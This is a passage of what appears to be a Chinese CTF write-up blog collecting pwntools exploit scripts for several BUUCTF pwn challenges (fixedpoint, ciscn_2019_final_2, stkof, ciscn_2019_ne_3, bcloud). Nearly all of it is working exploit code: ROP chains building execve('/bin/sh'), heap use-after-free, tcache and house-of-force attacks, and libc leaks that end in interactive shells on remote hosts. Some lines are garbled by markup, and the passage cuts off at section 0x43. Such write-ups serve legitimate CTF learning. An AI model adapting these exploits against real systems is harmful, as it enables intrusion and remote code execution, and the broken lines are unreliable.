id="0x38-fixedpoint-plaid-2016"><a href="#0x38-fixedpoint-plaid-2016" class="headerlink" title="0x38 fixedpoint_plaid_2016"></a>0x38 fixedpoint_plaid_2016</h2><h3 id="这题就是典型的shellcode，找数字吧小伙子"><a href="#这题就是典型的shellcode，找数字吧小伙子" class="headerlink" title="这题就是典型的shellcode，找数字吧小伙子~~"></a>这题就是典型的shellcode，找数字吧小伙子~~</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("fixedpoint_plaid_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def write(num):</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline("395841308")</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline("175700696")</span><br><span class="line">sleep(0.1)</span><br><span class="line">sh.sendline("177668635")</span><br><span class="line">def send(num):</span><br><span class="line">sh.sendline(str(num))</span><br><span class="line">sleep(0.1)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./fixedpoint_plaid_2016")</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">send(443750948)</span><br><span class="line">write(394804464)</span><br><span class="line">write(395349960)</span><br><span class="line">write(395424832)</span><br><span class="line">write(395478312)</span><br><span class="line">write(394804464)</span><br><span class="line">write(394804464)</span><br><span class="line">write(395531792)</span><br><span class="line">write(395414136)</span><br><span class="line">write(394301752)</span><br><span class="line">send(188835259)</span><br><span class="line">send(275002318)</span><br><span class="line">send(247465383)</span><br><span class="line">send(274506417)</span><br><span class="line">sh.sendline("a")</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20072,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x39-ciscn-2019-final-2"><a href="#0x39-ciscn-2019-final-2" class="headerlink" title="0x39 ciscn_2019_final_2"></a>0x39 ciscn_2019_final_2</h2><h3 id="典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"><a href="#典型的UAF和tcache-attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag" class="headerlink" title="典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag"></a>典型的UAF和tcache attack，但是dup2函数需要我们将stdin的fileno替换为666，然后再输入一次数据（即功能4退出里的scanf），就可以输出flag</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_final_2")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def addInt(num):</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil("your inode number:")</span><br><span class="line">    sh.send(str(num))</span><br><span class="line">def showInt():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    return sh.recvuntil("\n",True)</span><br><span class="line">def showShort():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("3")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(":")</span><br><span class="line">    return sh.recvuntil("\n",True)</span><br><span class="line">def addShort(num):</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil("your inode number:")</span><br><span class="line">    sh.sendline(str(num))</span><br><span class="line">def freeInt():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("1")</span><br><span class="line">def freeShort():</span><br><span class="line">    sh.recvuntil("> ")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">    sh.recvuntil(">")</span><br><span class="line">    sh.sendline("2")</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug == 1):</span><br><span class="line">        sh = process("./ciscn_2019_final_2")</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    else:</span><br><span class="line">        sh = remote(ip,port)</span><br><span class="line">        lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeShort()</span><br><span class="line">    addInt(0x11)</span><br><span class="line">    freeShort()</span><br><span class="line">    chunk_addr1 = int(showShort(),10)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(chunk_addr1 - 0xa0)</span><br><span class="line">    addShort(0x91)</span><br><span class="line">    for i in range(7):</span><br><span class="line">        freeInt()</span><br><span class="line">        addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr2 = int(showInt(),10)</span><br><span class="line">    main_arena = chunk_addr2 - 96</span><br><span class="line">    fileno = main_arena - 0x1D8</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(0x100)</span><br><span class="line">    freeInt()</span><br><span class="line">    addShort(0x21)</span><br><span class="line">    freeInt()</span><br><span class="line">    chunk_addr3 = int(showInt(),10)</span><br><span class="line">    addInt(chunk_addr3 - 0x30)</span><br><span class="line">    addInt(0x9999)</span><br><span class="line">    addInt(fileno)</span><br><span class="line">    addInt(666)</span><br><span class="line">    sh.sendline("4")</span><br><span class="line">    if debug == 1:</span><br><span class="line">        log.success("pid = " + str(sh.pid)) </span><br><span class="line">    sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    pwn("pwn.buuoj.cn",20231,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x40-强网杯2019-拟态-STKOF"><a href="#0x40-强网杯2019-拟态-STKOF" class="headerlink" title="0x40 强网杯2019 拟态 STKOF"></a>0x40 强网杯2019 拟态 STKOF</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf1 = ELF("__stkof")</span><br><span class="line">elf2 = ELF("_stkof")</span><br><span class="line">sh1 = 0</span><br><span class="line">sh2 = 0</span><br><span class="line">def rop32():</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080d9060) # @ .data< span><br><span class="line">p += pack('<i', 0x080a8af6) # pop eax ; ret< span><br><span class="line">p += '/bin'</span><br><span class="line">p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080d9064) # @ .data + 4< span><br><span class="line">p += pack('<i', 0x080a8af6) # pop eax ; ret< span><br><span class="line">p += '//sh'</span><br><span class="line">p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08056040) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x08056a85) # mov dword ptr [edx], eax ; ret< span><br><span class="line">p += pack('<i', 0x080481c9) # pop ebx ; ret< span><br><span class="line">p += pack('<i', 0x080d9060) # @ .data< span><br><span class="line">p += pack('<i', 0x0806e9f2) # pop ecx ; ebx ret< span><br><span class="line">p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x080d9060) # padding without overwrite ebx< span><br><span class="line">p += pack('<i', 0x0806e9cb) # pop edx ; ret< span><br><span class="line">p += pack('<i', 0x080d9068) # @ .data + 8< span><br><span class="line">p += pack('<i', 0x08056040) # xor eax, eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x0807be5a) # inc eax ; ret< span><br><span class="line">p += pack('<i', 0x080495a3) # int 0x80< span><br><span class="line">return p</span><br><span class="line">def rop64():</span><br><span class="line">p = ''</span><br><span class="line">p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006a10e0) # @ .data< span><br><span class="line">p += pack('<q', 0x000000000043b97c) # pop rax ; ret< span><br><span class="line">p += '/bin//sh'</span><br><span class="line">p += pack('<q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000436ed0) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret< span><br><span class="line">p += pack('<q', 0x00000000004005f6) # pop rdi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006a10e0) # @ .data< span><br><span class="line">p += pack('<q', 0x0000000000405895) # pop rsi ; ret< span><br><span class="line">p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x000000000043b9d5) # pop rdx ; ret< span><br><span class="line">p += pack('<q', 0x00000000006a10e8) # @ .data + 8< span><br><span class="line">p += pack('<q', 0x0000000000436ed0) # xor rax, rax ; ret< span><br><span class="line">p += pack('<q', 1 0x000000000040e09f) # add rax, ; ret< span><br><span class="line">p += pack('<q', 1 0x00000000004610a0) # add rax, ; ret< span><br><span class="line">p += pack('<q', 0x0000000000461645) # syscall ; ret< span><br><span class="line">return p</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh1</span><br><span class="line">global sh2</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">#sh1 = process("./__stkof")</span><br><span class="line">sh2 = process("./_stkof")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">offset1  = 272</span><br><span class="line">payload  = offset1 * 'a'</span><br><span class="line">payload += p32(0x0806b225)</span><br><span class="line">offset2  = 256</span><br><span class="line">payload += p32(0) + rop64()</span><br><span class="line">payload  = payload.ljust(offset1 + offset2 + 4,'a')</span><br><span class="line">payload += rop32()</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("node1.buuoj.cn",28669,0)</span><br></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></q',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></i',></span></pre></td></tr></tbody></table></figure></div><h2 id="0x41-ciscn-2019-ne-3"><a href="#0x41-ciscn-2019-ne-3" class="headerlink" title="0x41 ciscn_2019_ne_3"></a>0x41 ciscn_2019_ne_3</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("ciscn_2019_ne_3")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./ciscn_2019_ne_3")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">pop_ebx_ret = 0x08048431</span><br><span class="line">pop_ebp_ret = 0x0804881b</span><br><span class="line">pop3_ret = 0x08048819</span><br><span class="line">leave_ret = 0x08048575</span><br><span class="line">base = 0x0804A800</span><br><span class="line">sh.recvuntil("name?")</span><br><span class="line">sh.send("a" * 9)</span><br><span class="line">sh.recvuntil("password:")</span><br><span class="line">sh.send("-1\x00\x00"+ p32(0x08048793) + p32(0x0804A060) + p32(0x500))</span><br><span class="line">sh.recvuntil("):")</span><br><span class="line">offset   = 56 + 4 * 4</span><br><span class="line">payload  = offset * 'a'</span><br><span class="line">payload += p32(0x0804A064 + 4)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">payload  = p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">payload += p32(pop_ebp_ret) + p32(base) + p32(leave_ret) </span><br><span class="line">sh.sendline(payload)</span><br><span class="line">payload  = p32(0) + p32(elf.plt['puts']) + p32(pop_ebx_ret) + p32(elf.got['__libc_start_main'])</span><br><span class="line">payload += p32(elf.plt['read']) + p32(pop3_ret) + p32(0) + p32(base) + p32(0x500)</span><br><span class="line">sleep(0.2)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">__libc_start_main = u32(sh.recv(4))</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">sleep(0.2)</span><br><span class="line">payload = p32(0)*3 + p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20169,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x42-bcloud-bctf-2016"><a href="#0x42-bcloud-bctf-2016" class="headerlink" title="0x42 bcloud_bctf_2016"></a>0x42 bcloud_bctf_2016</h2><h3 id="典型的house-of-force"><a href="#典型的house-of-force" class="headerlink" title="典型的house of force"></a>典型的house of force</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "i386"</span><br><span class="line">elf = ELF("bcloud_bctf_2016")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size,content):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("1")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">if size > 0:</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def edit(idx,content):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("3")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(content)</span><br><span class="line">def free(idx):</span><br><span class="line">sh.recvuntil(">>")</span><br><span class="line">sh.sendline("4")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">global sh</span><br><span class="line">global lib</span><br><span class="line">if(debug == 1):</span><br><span class="line">sh = process("./bcloud_bctf_2016")</span><br><span class="line">lib = ELF("/lib/i386-linux-gnu/libc.so.6")</span><br><span class="line">else:</span><br><span class="line">sh = remote(ip,port)</span><br><span class="line">lib = ELF("/home/pig/Pig/CTF/BUUCTF/BUUCTF_libc/x86_libc.so.6")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send("b" * 0x40)</span><br><span class="line">sh.recvuntil("b" * 0x40)</span><br><span class="line">heap_base = (u32(sh.recv(4)) >> 12) << 12</span><br><span class="line">topChunk = heap_base + 0xd8</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.send(0x40 * "a")</span><br><span class="line">sh.recvuntil(":")</span><br><span class="line">sh.sendline("\xff" * 0x4)</span><br><span class="line">notesize_addr = 0x0804B0A0</span><br><span class="line">notelist_addr = 0x0804B120</span><br><span class="line">add(notesize_addr - topChunk - 0x10,'')</span><br><span class="line">payload = p32(0x400) * 10</span><br><span class="line">payload = payload.ljust(0x0804B120 - 0x0804B0A0,'\x00')</span><br><span class="line">payload += p32(elf.got['free'])</span><br><span class="line">payload += p32(notesize_addr)</span><br><span class="line">payload += p32(elf.got['__libc_start_main'])</span><br><span class="line">add(0x400,payload + "\n")</span><br><span class="line">edit(0,p32(elf.plt['puts']) + "\n")</span><br><span class="line">free(2)</span><br><span class="line">__libc_start_main = u32(sh.recvuntil('\xf7')[-4:])</span><br><span class="line">libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line">system = libc + lib.symbols['system']</span><br><span class="line">binsh = libc + lib.search("/bin/sh\x00").next()</span><br><span class="line">edit(0,p32(system) + "\n")</span><br><span class="line">edit(1,payload + p32(binsh) + "\n")</span><br><span class="line">free(3)</span><br><span class="line">sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">pwn("pwn.buuoj.cn",20020,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x43-web-of-sci-volga-2016"><a href="#0x43-web-of-sci-volga-2016" class="headerlink" title="0x43 web_of_sci_volga_2016"></a>0x43 web_of_sci_volga_2016</h2><h3 id="leak-canary，然后普通的ROP"><a href="#leak-canary，然后普通的ROP" class="headerlink" title="leak canary，然后普通的ROP"></a>leak canary，然后普通的ROP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span 